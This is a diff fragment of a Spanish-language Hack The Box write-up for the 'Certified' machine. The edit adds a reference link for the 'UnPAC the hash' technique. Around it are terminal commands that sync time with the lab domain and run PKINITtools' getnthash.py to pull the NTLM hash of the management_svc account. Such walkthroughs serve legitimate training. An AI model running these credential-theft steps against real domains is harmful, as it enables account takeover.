@@ -340,7 +340,7 @@ Configuro el archivo de caché de credenciales. Y vuelvo a sincronizar el tiempo
 /home/kali/Documents/htb/machines/certified:-$ sudo ntpdate certified.htb
 ```
 
-Por ultimo, Realizo un [UnPAC the hash]() para solicitar el hash NTLM del usuario `management_svc`.
+Por ultimo, Realizo un [UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash) para solicitar el hash NTLM del usuario `management_svc`.
 
 ```terminal
 (Entorno_Python)-/home/kali/Documents/htb/machines/certified:-$ sudo python ~/Documents/github/PKINITtools/getnthash.py -key 13009a39adb679e473a6adb24f5b8d89416a891de7e91db5a1a6940c6569e24b certified.htb/management_svc
